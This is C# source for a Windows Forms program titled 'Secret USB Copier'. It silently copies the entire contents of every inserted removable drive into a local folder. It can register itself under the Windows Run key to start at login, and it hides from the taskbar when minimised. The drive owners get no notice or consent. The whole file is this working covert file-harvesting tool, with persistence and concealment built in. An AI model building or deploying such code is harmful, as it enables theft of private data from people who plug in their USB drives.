using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using System.Xml;

namespace Secret_USB_Copier
{
    public partial class Form_SecretUSBCopier : Form
    {
        RegistryKey regKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

        Thread t;
        public Form_SecretUSBCopier()
        {
            InitializeComponent();
           
            if (regKey.GetValue("Secret USB Copier") == null)
                checkBox_StartWithWindowsAndMinimize.Checked = false;
            else
                checkBox_StartWithWindowsAndMinimize.Checked = true;

            textBox_Directory.Text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "USB Backups");

            t = new Thread(new ThreadStart(doWhileActivated));
            t.Start();

            timer.Start();
            timer.Tick += new EventHandler(timer_Tick);
            
            timer.Interval = 1000;
            timer.Enabled = true;
        }
        public void GetDevice()
        {
            dataGridView_Devices.Rows.Clear();

            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                if (drive.IsReady == true && (drive.DriveType == DriveType.Fixed || drive.DriveType == DriveType.Removable || drive.DriveType == DriveType.CDRom))
                {
                    dataGridView_Devices.Rows.Add(drive.Name, drive.VolumeLabel, drive.DriveType, drive.TotalSize / (1024 * 1024 * 1024) + " GB");
                }
            }
        }
        
        private void timer_Tick(object sender, EventArgs e)
        {
            try
            {
                GetDevice();
            }
            catch (Exception) { }

            if (this.WindowState == FormWindowState.Minimized)
            {
                Display();
            }
        }
        public void copyIt(DriveInfo drive)
        {
            if (drive.IsReady == true )
            {
                string sourceDir = drive.Name;
                string distinationDir = Path.Combine(textBox_Directory.Text, drive.VolumeLabel);
                    
                if (!Directory.Exists(distinationDir))
                {
                    Directory.CreateDirectory(distinationDir);
                }
                CopyFolder(sourceDir, distinationDir);

            }
        }

        public void CopyFolder(string sourceFolder, string destFolder)
        {
            try {

                if (!Directory.Exists(destFolder))
                {
                    Directory.CreateDirectory(destFolder);
                }

                string[] files = Directory.GetFiles(sourceFolder);
                foreach (string file in files)
                {
                    string name = Path.GetFileName(file);
                    string dest = Path.Combine(destFolder, name);
                    File.Copy(file, dest);
                }

                string[] folders = Directory.GetDirectories(sourceFolder);
                foreach (string folder in folders)
                {
                    string name = Path.GetFileName(folder);
                    string dest = Path.Combine(destFolder, name);
                    CopyFolder(folder, dest);
                }
            }
            catch (Exception) { }
        }
          
        private bool doCopy = false;
        private void button_Activate_Click(object sender, EventArgs e)
        {
            label_Status.Text = "Active";
            label_Status.ForeColor = Color.Green;

            timer.Start();

            doCopy = true;

            if (button_Activate.Enabled == true)
            {
                button_Activate.Enabled = false;
                button_Deactivate.Enabled = true;
            }
            
        }
        private void button_Deactivate_Click(object sender, EventArgs e)
        {
            label_Status.Text = "Inactive";
            label_Status.ForeColor = Color.Red;

            timer.Stop();
            dataGridView_Devices.Rows.Clear();

            doCopy = false;

            if (button_Deactivate.Enabled == true)
            {
                button_Deactivate.Enabled = false;
                button_Activate.Enabled = true;
            }
        }

        public void Display()
        {

            if (this.WindowState == FormWindowState.Minimized)
            {
                this.ShowInTaskbar = false;
                notifyIcon.ContextMenuStrip = contextMenuStrip;
            }
        }

        private void button_Refresh_Click(object sender, EventArgs e)
        {
            GetDevice();
        }

        private void ni_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            WindowState = FormWindowState.Normal;
        }
        private void showSettingtoolStripMenuItem_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Normal;
        }

        private void activetoolStripMenuItem_Click(object sender, EventArgs e)
        {
            contextMenuStrip.ItemClicked += new ToolStripItemClickedEventHandler(button_Activate_Click);
        }

        private void deactivatetoolStripMenuItem_Click(object sender, EventArgs e)
        {
            contextMenuStrip.ItemClicked += new ToolStripItemClickedEventHandler(button_Deactivate_Click);
        }
        private void restoreToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Normal;
        }

        private void abouttoolStripMenuItem_Click(object sender, EventArgs e)
        {
            new AboutBox().Show();
        }

        private void exitToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("Do you want to exit ?","Are you sure?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation,
                                MessageBoxDefaultButton.Button1) == DialogResult.Yes)
            {
                Application.Exit();
            }
        }

        private void doWhileActivated()
        {
            Thread.Sleep(1000);
            
            while (true)
            {
                if (doCopy)
                {
                    foreach (DriveInfo drive in DriveInfo.GetDrives())
                    {
                        if (drive.DriveType == DriveType.Removable)
                        {
                            try {
                                copyIt(drive);
                            }
                            catch (Exception) { }
                        }
                    }
                }
            }
        }

        private void checkBox_StartWithWindows_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox_StartWithWindowsAndMinimize.Checked)
            {
                regKey.SetValue("Secret USB Copier", Application.ExecutablePath.ToString());
                this.WindowState = FormWindowState.Minimized;
            }

            else
            {
                regKey.DeleteValue("Secret USB Copier", false);
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void button_Changedirectory_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog fbd = new FolderBrowserDialog();

            if (fbd.ShowDialog() == DialogResult.OK)
            {
                textBox_Directory.Text = fbd.SelectedPath;
            }
        }

        private void button_Opendirectory_Click(object sender, EventArgs e)
        {
            Process.Start(textBox_Directory.Text);
        }
        
    }
}